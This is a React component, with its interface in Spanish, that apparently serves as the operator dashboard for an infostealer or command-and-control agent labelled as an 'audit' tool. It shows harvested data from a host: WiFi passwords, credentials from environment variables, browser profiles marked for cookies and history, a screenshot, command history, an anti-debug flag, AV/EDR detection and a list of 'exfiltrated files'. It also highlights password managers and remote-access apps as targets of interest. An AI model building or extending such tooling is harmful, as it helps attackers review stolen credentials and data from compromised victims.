import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import {
  ArrowLeft, Shield, AlertTriangle, Wifi, Users, Lock, Monitor,
  Terminal, Globe, Database, Eye, Copy, ChevronDown, ChevronRight,
  Key, Package, Server, Activity, Cpu, Network, FolderOpen,
  CheckCircle, XCircle, Maximize2, X, Hash, Fingerprint
} from "lucide-react";

// ── Paleta ────────────────────────────────────────────────────────────────────
const BG      = "#0d1117";
const CARD    = "#161b22";
const BORDER  = "#21262d";
const BLUE    = "#58a6ff";
const GREEN   = "#3fb950";
const YELLOW  = "#d29922";
const RED     = "#f85149";
const PURPLE  = "#bc8cff";
const ORANGE  = "#e3b341";
const MUTED   = "#8b949e";

// ── Helpers ───────────────────────────────────────────────────────────────────
const arr  = (v) => (Array.isArray(v) ? v : []);
const safe = (v) => (v != null ? v : "—");

function Badge({ label, color }) {
  return (
    <span style={{
      background: color + "22", border: `1px solid ${color}44`,
      color, borderRadius: 4, padding: "1px 8px", fontSize: 11, fontWeight: 600,
    }}>
      {label}
    </span>
  );
}

function Section({ icon: Icon, title, color = BLUE, count, children, defaultOpen = false }) {
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div style={{ background: CARD, border: `1px solid ${BORDER}`, borderRadius: 8, overflow: "hidden", marginBottom: 12 }}>
      <div onClick={() => setOpen(!open)} style={{
        display: "flex", alignItems: "center", gap: 12, padding: "14px 18px",
        cursor: "pointer", userSelect: "none",
        borderBottom: open ? `1px solid ${BORDER}` : "none",
      }}>
        <div style={{ background: color + "22", padding: 7, borderRadius: 7, display: "flex" }}>
          <Icon size={16} color={color} />
        </div>
        <span style={{ fontWeight: 600, color: "#e6edf3", flex: 1 }}>{title}</span>
        {count != null && (
          <span style={{ background: color + "22", color, borderRadius: 10, padding: "1px 9px", fontSize: 12, fontWeight: 700 }}>
            {count}
          </span>
        )}
        {open ? <ChevronDown size={14} color={MUTED} /> : <ChevronRight size={14} color={MUTED} />}
      </div>
      {open && <div style={{ padding: 18 }}>{children}</div>}
    </div>
  );
}

function StatCard({ label, value, color = "#e6edf3", sub }) {
  return (
    <div style={{ background: CARD, border: `1px solid ${BORDER}`, borderRadius: 8, padding: "16px 20px", flex: 1, minWidth: 130 }}>
      <div style={{ color: MUTED, fontSize: 11, marginBottom: 4, textTransform: "uppercase", letterSpacing: 1 }}>{label}</div>
      <div style={{ color, fontSize: 22, fontWeight: 700, fontFamily: "monospace" }}>{safe(value)}</div>
      {sub && <div style={{ color: MUTED, fontSize: 11, marginTop: 3 }}>{sub}</div>}
    </div>
  );
}

function CopyButton({ value }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={copy} style={{ background: "none", border: "none", cursor: "pointer", color: copied ? GREEN : MUTED, padding: 0 }}>
      {copied ? <CheckCircle size={13} /> : <Copy size={13} />}
    </button>
  );
}

function Chip({ label, color = BLUE }) {
  return (
    <span style={{
      background: color + "18", border: `1px solid ${color}33`,
      color, borderRadius: 20, padding: "3px 10px", fontSize: 12, whiteSpace: "nowrap"
    }}>
      {label}
    </span>
  );
}

// ── WiFi ─────────────────────────────────────────────────────────────────────
function WiFiSection({ networks }) {
  const nets = arr(networks);
  if (!nets.length) return <p style={{ color: MUTED, fontSize: 13 }}>Sin redes WiFi encontradas.</p>;
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {nets.map((n, i) => (
        <div key={i} style={{
          background: BG, border: `1px solid ${BORDER}`, borderRadius: 6,
          padding: "10px 14px", display: "flex", alignItems: "center", gap: 12
        }}>
          <Wifi size={14} color={n.password ? GREEN : MUTED} />
          <span style={{ color: "#e6edf3", fontWeight: 600, flex: 1, fontFamily: "monospace" }}>{n.ssid}</span>
          {n.password ? (
            <span style={{ color: GREEN, fontFamily: "monospace", fontSize: 13, background: GREEN + "15", padding: "2px 10px", borderRadius: 4 }}>
              {n.password}
            </span>
          ) : (
            <span style={{ color: MUTED, fontSize: 12 }}>Sin contraseña / Open</span>
          )}
        </div>
      ))}
    </div>
  );
}

// ── Usuarios locales ──────────────────────────────────────────────────────────
function LocalUsersSection({ users }) {
  const list = arr(users);
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>Sin usuarios encontrados.</p>;
  return (
    <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
      <thead>
        <tr style={{ borderBottom: `1px solid ${BORDER}` }}>
          {["Usuario", "Administrador", "Estado"].map(h => (
            <th key={h} style={{ padding: "6px 12px", textAlign: "left", color: MUTED, fontWeight: 600, fontSize: 11, textTransform: "uppercase" }}>{h}</th>
          ))}
        </tr>
      </thead>
      <tbody>
        {list.map((u, i) => (
          <tr key={i} style={{ borderBottom: `1px solid ${BORDER}66` }}>
            <td style={{ padding: "8px 12px", color: "#e6edf3", fontFamily: "monospace", fontWeight: 600 }}>{u.username}</td>
            <td style={{ padding: "8px 12px" }}>
              {u.is_admin
                ? <Badge label="ADMIN" color={RED} />
                : <span style={{ color: MUTED, fontSize: 12 }}>—</span>}
            </td>
            <td style={{ padding: "8px 12px" }}>
              {u.is_active
                ? <Badge label="Activo" color={GREEN} />
                : <Badge label="Inactivo" color={MUTED} />}
            </td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}

// ── AV / EDR ──────────────────────────────────────────────────────────────────
function SecuritySection({ products }) {
  const list = arr(products);
  if (!list.length) return (
    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
      <AlertTriangle size={14} color={YELLOW} />
      <span style={{ color: YELLOW, fontSize: 13 }}>No se detectó ningún producto de seguridad</span>
    </div>
  );
  return (
    <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
      {list.map((p, i) => (
        <div key={i} style={{
          background: GREEN + "15", border: `1px solid ${GREEN}33`,
          borderRadius: 6, padding: "8px 14px", display: "flex", alignItems: "center", gap: 8
        }}>
          <Shield size={13} color={GREEN} />
          <span style={{ color: GREEN, fontWeight: 600 }}>{p}</span>
        </div>
      ))}
    </div>
  );
}

// ── Privilegios ───────────────────────────────────────────────────────────────
function PrivilegesSection({ privileges }) {
  const list = arr(privileges);
  const dangerous = ["SeDebugPrivilege","SeImpersonatePrivilege","SeAssignPrimaryTokenPrivilege","SeTcbPrivilege","SeCreateTokenPrivilege","SeLoadDriverPrivilege"];
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>Sin privilegios habilitados.</p>;
  return (
    <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
      {list.map((p, i) => {
        const isDangerous = dangerous.some(d => p.includes(d));
        return (
          <div key={i} style={{
            background: isDangerous ? RED + "18" : BG,
            border: `1px solid ${isDangerous ? RED + "55" : BORDER}`,
            borderRadius: 6, padding: "6px 12px", display: "flex", alignItems: "center", gap: 6
          }}>
            {isDangerous && <AlertTriangle size={11} color={RED} />}
            <span style={{ color: isDangerous ? RED : "#c9d1d9", fontFamily: "monospace", fontSize: 12 }}>{p}</span>
          </div>
        );
      })}
    </div>
  );
}

// ── Variables de entorno con credenciales ─────────────────────────────────────
function EnvCredsSection({ creds }) {
  const list = arr(creds);
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>No se encontraron credenciales en variables de entorno.</p>;
  return (
    <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13, fontFamily: "monospace" }}>
      <thead>
        <tr style={{ borderBottom: `1px solid ${BORDER}` }}>
          {["Variable", "Valor (parcial)"].map(h => (
            <th key={h} style={{ padding: "6px 12px", textAlign: "left", color: MUTED, fontWeight: 600, fontSize: 11, textTransform: "uppercase", fontFamily: "sans-serif" }}>{h}</th>
          ))}
        </tr>
      </thead>
      <tbody>
        {list.map((c, i) => (
          <tr key={i} style={{ borderBottom: `1px solid ${BORDER}44` }}>
            <td style={{ padding: "7px 12px", color: YELLOW }}>{c.key}</td>
            <td style={{ padding: "7px 12px", color: "#e6edf3" }}>{c.value}</td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}

// ── Navegadores ───────────────────────────────────────────────────────────────
function BrowserSection({ browsers }) {
  const list = arr(browsers);
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>No se detectaron navegadores.</p>;
  const icons = { "Google Chrome": "🌐", "Mozilla Firefox": "🦊", "Microsoft Edge": "🔷", "Brave": "🦁", "Opera": "🎭", "Vivaldi": "🎻" };
  return (
    <div style={{ display: "flex", flexWrap: "wrap", gap: 10 }}>
      {list.map((b, i) => (
        <div key={i} style={{
          background: BLUE + "15", border: `1px solid ${BLUE}33`, borderRadius: 6,
          padding: "10px 18px", display: "flex", alignItems: "center", gap: 10
        }}>
          <span style={{ fontSize: 18 }}>{icons[b] || "🌐"}</span>
          <span style={{ color: BLUE, fontWeight: 600 }}>{b}</span>
          <span style={{ color: YELLOW, fontSize: 11, background: YELLOW + "22", padding: "1px 6px", borderRadius: 4 }}>Cookies / Historial</span>
        </div>
      ))}
    </div>
  );
}

// ── Apps instaladas ───────────────────────────────────────────────────────────
function InstalledAppsSection({ apps }) {
  const list = arr(apps);
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>No se detectaron aplicaciones de interés.</p>;
  const categories = {
    "Gestor de Contraseñas": ["keepass","1password","lastpass","bitwarden","dashlane","roboform"],
    "SSH / FTP": ["putty","winscp","filezilla","mobaxterm","termius"],
    "Virtualización": ["virtualbox","vmware"],
    "VPN": ["openvpn","nordvpn","expressvpn","wireguard"],
    "Acceso Remoto": ["anydesk","teamviewer","vnc","radmin"],
    "DevTools": ["docker","kubectl","git","python","ruby","perl"],
    "Seguridad": ["wireshark","nmap","burp","metasploit"],
  };
  const getCategory = (name) => {
    const lower = name.toLowerCase();
    for (const [cat, kws] of Object.entries(categories)) {
      if (kws.some(kw => lower.includes(kw))) return cat;
    }
    return "Otro";
  };
  const catColors = {
    "Gestor de Contraseñas": RED, "SSH / FTP": BLUE, "Virtualización": PURPLE,
    "VPN": GREEN, "Acceso Remoto": YELLOW, "DevTools": ORANGE, "Seguridad": RED,
  };
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {list.map((a, i) => {
        const cat = getCategory(a.name);
        const color = catColors[cat] || MUTED;
        return (
          <div key={i} style={{
            background: BG, border: `1px solid ${BORDER}`, borderRadius: 6,
            padding: "9px 14px", display: "flex", alignItems: "center", gap: 12
          }}>
            <Package size={13} color={color} />
            <span style={{ color: "#e6edf3", fontWeight: 600, flex: 1 }}>{a.name}</span>
            {a.version && <span style={{ color: MUTED, fontFamily: "monospace", fontSize: 12 }}>v{a.version}</span>}
            <Badge label={cat} color={color} />
          </div>
        );
      })}
    </div>
  );
}

// ── Procesos ──────────────────────────────────────────────────────────────────
function ProcessTable({ processes }) {
  const [sort, setSort] = useState("cpu");
  const [dir, setDir] = useState(-1);
  const list = arr(processes);
  const toggle = (col) => { if (sort === col) setDir(d => -d); else { setSort(col); setDir(-1); } };
  const sorted = [...list].sort((a, b) => (a[sort] > b[sort] ? 1 : -1) * dir);
  const cols = [
    { key: "pid", label: "PID" },
    { key: "name", label: "Nombre" },
    { key: "cpu", label: "CPU %", bar: true, max: 100 },
    { key: "memory", label: "RAM %", bar: true, max: 100 },
  ];
  return (
    <div style={{ overflowX: "auto" }}>
      <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
        <thead>
          <tr style={{ borderBottom: `1px solid ${BORDER}` }}>
            {cols.map(c => (
              <th key={c.key} onClick={() => toggle(c.key)} style={{
                padding: "6px 10px", textAlign: "left", color: sort === c.key ? BLUE : MUTED,
                fontWeight: 600, cursor: "pointer", whiteSpace: "nowrap",
                fontSize: 11, textTransform: "uppercase"
              }}>{c.label} {sort === c.key ? (dir === -1 ? "↓" : "↑") : ""}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {sorted.slice(0, 100).map((p, i) => (
            <tr key={i} style={{ borderBottom: `1px solid ${BORDER}44` }}>
              <td style={{ padding: "5px 10px", color: MUTED, fontFamily: "monospace" }}>{p.pid}</td>
              <td style={{ padding: "5px 10px", color: "#c9d1d9", fontFamily: "monospace" }}>{p.name}</td>
              <td style={{ padding: "5px 10px", minWidth: 100 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <div style={{ flex: 1, background: BORDER, borderRadius: 2, height: 5, overflow: "hidden" }}>
                    <div style={{ width: `${Math.min(p.cpu, 100)}%`, background: p.cpu > 50 ? RED : GREEN, height: "100%" }} />
                  </div>
                  <span style={{ color: p.cpu > 50 ? RED : "#c9d1d9", fontSize: 11, width: 36, textAlign: "right" }}>{p.cpu?.toFixed(1)}%</span>
                </div>
              </td>
              <td style={{ padding: "5px 10px", minWidth: 100 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <div style={{ flex: 1, background: BORDER, borderRadius: 2, height: 5, overflow: "hidden" }}>
                    <div style={{ width: `${Math.min(p.memory, 100)}%`, background: BLUE, height: "100%" }} />
                  </div>
                  <span style={{ color: "#c9d1d9", fontSize: 11, width: 36, textAlign: "right" }}>{p.memory?.toFixed(1)}%</span>
                </div>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

// ── Conexiones ────────────────────────────────────────────────────────────────
function ConnectionTable({ connections }) {
  const list = arr(connections);
  const statusColor = { ESTABLISHED: GREEN, LISTEN: BLUE, TIME_WAIT: YELLOW, CLOSE_WAIT: ORANGE };
  const counts = list.reduce((acc, c) => { acc[c.status] = (acc[c.status] || 0) + 1; return acc; }, {});
  return (
    <>
      <div style={{ display: "flex", gap: 12, marginBottom: 12, flexWrap: "wrap" }}>
        {Object.entries(counts).map(([status, count]) => (
          <div key={status} style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <div style={{ width: 8, height: 8, borderRadius: "50%", background: statusColor[status] || MUTED }} />
            <span style={{ color: statusColor[status] || MUTED, fontSize: 12 }}>{count} {status}</span>
          </div>
        ))}
      </div>
      <div style={{ overflowX: "auto" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12, fontFamily: "monospace" }}>
          <thead>
            <tr style={{ borderBottom: `1px solid ${BORDER}` }}>
              {["Proto", "Local", "Remoto", "Estado"].map(h => (
                <th key={h} style={{ padding: "5px 10px", textAlign: "left", color: MUTED, fontSize: 11, textTransform: "uppercase", fontFamily: "sans-serif" }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {list.map((c, i) => {
              const localObj = typeof c.local === "string" ? c.local : JSON.stringify(c.local);
              const remoteObj = typeof c.remote === "string" ? c.remote : JSON.stringify(c.remote);
              return (
                <tr key={i} style={{ borderBottom: `1px solid ${BORDER}44` }}>
                  <td style={{ padding: "4px 10px", color: PURPLE, textTransform: "uppercase" }}>{c.protocol}</td>
                  <td style={{ padding: "4px 10px", color: "#c9d1d9" }}>{localObj}</td>
                  <td style={{ padding: "4px 10px", color: MUTED }}>{remoteObj}</td>
                  <td style={{ padding: "4px 10px", color: statusColor[c.status] || MUTED }}>{c.status}</td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </>
  );
}

// ── Persistencia ──────────────────────────────────────────────────────────────
function PersistenceSection({ items }) {
  const list = arr(items);
  if (!list.length) return <p style={{ color: GREEN, fontSize: 13 }}>✓ Sin mecanismos de persistencia detectados.</p>;
  const typeColor = (s) => {
    const sl = s.toLowerCase();
    if (sl.includes("runkey") || sl.includes("run:")) return YELLOW;
    if (sl.includes("startup")) return RED;
    if (sl.includes("cron") || sl.includes("systemd")) return PURPLE;
    if (sl.includes("autostart")) return ORANGE;
    return MUTED;
  };
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
      {list.map((item, i) => {
        const color = typeColor(String(item));
        const text = typeof item === "string" ? item : JSON.stringify(item);
        return (
          <div key={i} style={{
            background: color + "12", border: `1px solid ${color}44`,
            borderLeft: `3px solid ${color}`, borderRadius: 4, padding: "8px 12px",
            display: "flex", gap: 10, alignItems: "flex-start"
          }}>
            <AlertTriangle size={13} color={color} style={{ marginTop: 2, flexShrink: 0 }} />
            <span style={{ color: "#e6edf3", fontFamily: "monospace", fontSize: 12, wordBreak: "break-all" }}>{text}</span>
          </div>
        );
      })}
    </div>
  );
}

// ── Historial de comandos ────────────────────────────────────────────────────
function CommandHistory({ commands }) {
  const list = arr(commands).filter(c => String(c).trim());
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>Sin historial de comandos.</p>;
  return (
    <div style={{ background: "#010409", border: `1px solid ${BORDER}`, borderRadius: 6, padding: 16, fontFamily: "monospace", fontSize: 12, maxHeight: 320, overflowY: "auto" }}>
      {list.map((cmd, i) => (
        <div key={i} style={{ display: "flex", gap: 12, padding: "2px 0", color: "#c9d1d9" }}>
          <span style={{ color: "#30363d", width: 32, textAlign: "right", userSelect: "none" }}>{i + 1}</span>
          <span style={{ color: "#79c0ff" }}>$</span>
          <span>{String(cmd)}</span>
        </div>
      ))}
    </div>
  );
}

// ── Archivos exfiltrados ──────────────────────────────────────────────────────
function FileList({ files }) {
  const list = arr(files);
  if (!list.length) return <p style={{ color: MUTED, fontSize: 13 }}>Sin archivos.</p>;
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 4, maxHeight: 320, overflowY: "auto" }}>
      {list.map((f, i) => (
        <div key={i} style={{ background: BG, border: `1px solid ${BORDER}`, borderRadius: 4, padding: "7px 12px" }}>
          <div style={{ color: BLUE, fontFamily: "monospace", fontSize: 12 }}>{f.path}</div>
          {f.sha256 && <div style={{ color: MUTED, fontFamily: "monospace", fontSize: 11, marginTop: 2 }}>SHA256: {f.sha256}</div>}
        </div>
      ))}
    </div>
  );
}

// ── Screenshot ────────────────────────────────────────────────────────────────
function ScreenshotSection({ screenshot }) {
  const [fullscreen, setFullscreen] = useState(false);
  if (!screenshot) return <p style={{ color: MUTED, fontSize: 13 }}>Sin captura de pantalla.</p>;
  const src = screenshot.path || (typeof screenshot === "string" ? screenshot : null);
  if (!src) return <p style={{ color: MUTED, fontSize: 13 }}>Sin captura de pantalla.</p>;
  return (
    <>
      <div style={{ position: "relative", display: "inline-block", cursor: "pointer" }} onClick={() => setFullscreen(true)}>
        <img src={`/${src}`} alt="screenshot" style={{ maxWidth: "100%", borderRadius: 6, border: `1px solid ${BORDER}` }} />
        <div style={{
          position: "absolute", inset: 0, background: "rgba(0,0,0,.5)",
          opacity: 0, transition: ".2s", borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center",
        }}
          onMouseEnter={e => e.currentTarget.style.opacity = 1}
          onMouseLeave={e => e.currentTarget.style.opacity = 0}>
          <Maximize2 color="#fff" size={28} />
        </div>
      </div>
      {fullscreen && (
        <div onClick={() => setFullscreen(false)} style={{
          position: "fixed", inset: 0, background: "rgba(0,0,0,.9)", zIndex: 9999,
          display: "flex", alignItems: "center", justifyContent: "center",
        }}>
          <img src={`/${src}`} alt="screenshot" style={{ maxWidth: "95vw", maxHeight: "95vh", borderRadius: 8 }} />
          <button onClick={() => setFullscreen(false)} style={{
            position: "absolute", top: 20, right: 20, background: "none", border: "none", color: "#fff", cursor: "pointer"
          }}><X size={28} /></button>
        </div>
      )}
    </>
  );
}

// ── Blockchain ────────────────────────────────────────────────────────────────
function BlockchainInfo({ sequence, hash, prevHash }) {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
        <Hash size={14} color={PURPLE} />
        <span style={{ color: MUTED, fontSize: 12 }}>Secuencia</span>
        <span style={{ color: PURPLE, fontWeight: 700, fontFamily: "monospace" }}>#{sequence}</span>
      </div>
      {[["Hash bloque", hash, GREEN], ["Hash anterior", prevHash, MUTED]].map(([label, val, color]) => (
        <div key={label} style={{ background: BG, border: `1px solid ${BORDER}`, borderRadius: 6, padding: "10px 14px" }}>
          <div style={{ color: MUTED, fontSize: 11, marginBottom: 4 }}>{label}</div>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ color, fontFamily: "monospace", fontSize: 12, wordBreak: "break-all" }}>{val || "—"}</span>
            {val && <CopyButton value={val} />}
          </div>
        </div>
      ))}
    </div>
  );
}

// ── Main ──────────────────────────────────────────────────────────────────────
export default function ReportDetails() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [report, setReport] = useState(null);
  const [loading, setLoading] = useState(true);
  const [rawOpen, setRawOpen] = useState(false);

  useEffect(() => {
    fetch(`/api/audit/${id}`)
      .then(r => r.json())
      .then(d => { setReport(d); setLoading(false); })
      .catch(() => setLoading(false));
  }, [id]);

  if (loading) return (
    <div style={{ background: BG, minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", color: MUTED }}>
      Cargando reporte...
    </div>
  );
  if (!report) return (
    <div style={{ background: BG, minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", color: RED }}>
      Reporte no encontrado.
    </div>
  );

  const r = report;

  return (
    <div style={{ background: BG, minHeight: "100vh", color: "#e6edf3", fontFamily: "'Segoe UI', sans-serif" }}>
      {/* Header sticky */}
      <div style={{
        position: "sticky", top: 0, zIndex: 100,
        background: CARD + "ee", backdropFilter: "blur(12px)",
        borderBottom: `1px solid ${BORDER}`, padding: "12px 24px",
        display: "flex", alignItems: "center", gap: 12
      }}>
        <button onClick={() => navigate(-1)} style={{ background: "none", border: "none", color: MUTED, cursor: "pointer", display: "flex" }}>
          <ArrowLeft size={18} />
        </button>
        <Fingerprint size={16} color={BLUE} />
        <span style={{ color: "#e6edf3", fontWeight: 700, fontFamily: "monospace" }}>{r.hostname || r.agent_id}</span>
        {r.elevated && <Badge label="ADMIN" color={RED} />}
        {r.anti_debug && <Badge label="ANTI-DEBUG" color={YELLOW} />}
        {r.domain_name && <Badge label={"AD: " + r.domain_name} color={PURPLE} />}
        <span style={{ color: MUTED, fontSize: 12, marginLeft: "auto" }}>{r.os} · {r.arch}</span>
      </div>

      <div style={{ maxWidth: 1100, margin: "0 auto", padding: "24px 20px" }}>
        {/* Stats overview */}
        <div style={{ display: "flex", gap: 12, flexWrap: "wrap", marginBottom: 20 }}>
          <StatCard label="Usuario" value={r.user} color={r.elevated ? RED : "#e6edf3"} sub={r.elevated ? "Privilegiado" : "Usuario estándar"} />
          <StatCard label="SO / Arch" value={r.arch} color={BLUE} sub={r.os} />
          <StatCard label="Procesos" value={arr(r.processes).length} color={GREEN} />
          <StatCard label="Conexiones" value={arr(r.connections).length} color={BLUE} />
          <StatCard label="Usuarios locales" value={arr(r.local_users).length} color={arr(r.local_users).some(u => u.is_admin) ? RED : GREEN}
            sub={arr(r.local_users).filter(u => u.is_admin).length + " admins"} />
          <StatCard label="WiFi guardadas" value={arr(r.wifi_networks).length} color={GREEN}
            sub={arr(r.wifi_networks).filter(n => n.password).length + " con contraseña"} />
        </div>

        {/* Red */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 12 }}>
          <div style={{ background: CARD, border: `1px solid ${BORDER}`, borderRadius: 8, padding: 16 }}>
            <div style={{ color: MUTED, fontSize: 11, marginBottom: 8, textTransform: "uppercase", letterSpacing: 1 }}>IPs ({arr(r.ips).length})</div>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
              {arr(r.ips).map((ip, i) => <Chip key={i} label={ip} color={BLUE} />)}
            </div>
          </div>
          <div style={{ background: CARD, border: `1px solid ${BORDER}`, borderRadius: 8, padding: 16 }}>
            <div style={{ color: MUTED, fontSize: 11, marginBottom: 8, textTransform: "uppercase", letterSpacing: 1 }}>Red</div>
            <div style={{ fontSize: 13 }}>
              <div style={{ display: "flex", gap: 8, marginBottom: 4 }}>
                <span style={{ color: MUTED }}>Gateway:</span>
                <span style={{ color: "#e6edf3", fontFamily: "monospace" }}>{safe(r.gateway)}</span>
              </div>
              <div style={{ display: "flex", gap: 8 }}>
                <span style={{ color: MUTED }}>DNS:</span>
                <span style={{ color: "#e6edf3", fontFamily: "monospace" }}>{arr(r.dns).join(", ") || "—"}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Screenshot */}
        {r.screenshot && (
          <Section icon={Monitor} title="Captura de Pantalla" color={PURPLE} defaultOpen>
            <ScreenshotSection screenshot={r.screenshot} />
          </Section>
        )}

        {/* WiFi */}
        <Section icon={Wifi} title="Redes WiFi con Contraseña" color={GREEN} count={arr(r.wifi_networks).filter(n=>n.password).length} defaultOpen={arr(r.wifi_networks).length > 0}>
          <WiFiSection networks={r.wifi_networks} />
        </Section>

        {/* Usuarios */}
        <Section icon={Users} title="Usuarios Locales" color={RED} count={arr(r.local_users).length} defaultOpen={arr(r.local_users).some(u => u.is_admin)}>
          <LocalUsersSection users={r.local_users} />
        </Section>

        {/* AV */}
        <Section icon={Shield} title="Productos de Seguridad (AV / EDR)" color={GREEN} count={arr(r.security_products).length}>
          <SecuritySection products={r.security_products} />
        </Section>

        {/* Privilegios */}
        <Section icon={Key} title="Privilegios Habilitados" color={YELLOW} count={arr(r.token_privileges).length}>
          <PrivilegesSection privileges={r.token_privileges} />
        </Section>

        {/* Env Creds */}
        <Section icon={Lock} title="Credenciales en Variables de Entorno" color={YELLOW} count={arr(r.env_credentials).length}>
          <EnvCredsSection creds={r.env_credentials} />
        </Section>

        {/* Browsers */}
        <Section icon={Globe} title="Navegadores Instalados" color={BLUE} count={arr(r.browser_profiles).length}>
          <BrowserSection browsers={r.browser_profiles} />
        </Section>

        {/* Apps */}
        <Section icon={Package} title="Aplicaciones Relevantes" color={PURPLE} count={arr(r.installed_apps).length}>
          <InstalledAppsSection apps={r.installed_apps} />
        </Section>

        {/* Persistencia */}
        <Section icon={AlertTriangle} title="Mecanismos de Persistencia" color={RED} count={arr(r.persistence).length}>
          <PersistenceSection items={r.persistence} />
        </Section>

        {/* Procesos */}
        <Section icon={Cpu} title="Procesos Activos" color={BLUE} count={arr(r.processes).length}>
          <ProcessTable processes={r.processes} />
        </Section>

        {/* Conexiones */}
        <Section icon={Network} title="Conexiones de Red" color={GREEN} count={arr(r.connections).length} defaultOpen>
          <ConnectionTable connections={r.connections} />
        </Section>

        {/* Comandos */}
        <Section icon={Terminal} title="Historial de Comandos (PowerShell / Bash)" color={PURPLE} count={arr(r.commands_executed).length}>
          <CommandHistory commands={r.commands_executed} />
        </Section>

        {/* Archivos */}
        <Section icon={FolderOpen} title="Archivos Exfiltrados" color={ORANGE} count={arr(r.files_exfiltrated).length}>
          <FileList files={r.files_exfiltrated} />
        </Section>

        {/* Blockchain */}
        <Section icon={Hash} title="Integridad del Registro (Blockchain)" color={PURPLE} defaultOpen>
          <BlockchainInfo sequence={r.sequence} hash={r.hash} prevHash={r.prev_hash} />
        </Section>

        {/* Raw JSON */}
        <div style={{ marginTop: 8 }}>
          <button onClick={() => setRawOpen(!rawOpen)} style={{
            background: "none", border: `1px solid ${BORDER}`, color: MUTED,
            padding: "6px 14px", borderRadius: 6, cursor: "pointer", fontSize: 12
          }}>
            {rawOpen ? "Ocultar" : "Ver"} JSON raw
          </button>
          {rawOpen && (
            <pre style={{
              background: "#010409", border: `1px solid ${BORDER}`, borderRadius: 8,
              padding: 16, marginTop: 8, fontSize: 11, overflowX: "auto",
              color: "#8b949e", maxHeight: 400, overflowY: "auto"
            }}>
              {JSON.stringify(r, null, 2)}
            </pre>
          )}
        </div>
      </div>
    </div>
  );
}
